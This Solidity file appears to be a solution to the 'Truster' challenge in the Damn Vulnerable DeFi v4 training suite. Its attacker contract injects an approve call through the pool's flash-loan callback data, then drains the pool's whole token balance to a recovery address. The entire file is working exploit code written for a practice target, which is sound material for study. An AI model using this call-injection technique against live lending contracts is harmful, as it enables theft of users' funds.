// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusteeAttacker {
    DamnValuableToken token;
    TrusterLenderPool pool;
    address recovery;

    constructor(address _pool, address _token, address _recovery) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function attack() public returns (bool) {
        uint256 TOKENS_IN_POOL = token.balanceOf(address(pool));
        bytes memory callData = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
        pool.flashLoan(0, address(this), address(token), callData);
        token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
        token.transfer(recovery, TOKENS_IN_POOL);
        return true;
    }
}
